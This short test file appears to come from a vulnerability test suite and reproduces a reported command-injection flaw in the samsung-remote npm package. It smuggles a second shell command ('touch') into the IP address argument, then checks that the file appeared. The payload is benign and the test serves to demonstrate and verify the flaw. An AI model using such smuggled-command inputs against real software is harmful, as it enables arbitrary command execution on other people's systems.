//https://hackerone.com/reports/394294
test("Command Injection in samsung-remote", () => 
{
    const SamsungRemote = require('samsung-remote');
	const fs = require('fs');
	const path = './samsung-remote';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	var remote = new SamsungRemote({
		ip: '127.0.0.1; touch samsung-remote;' 
	});
	remote.isAlive(function(err) {});


	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
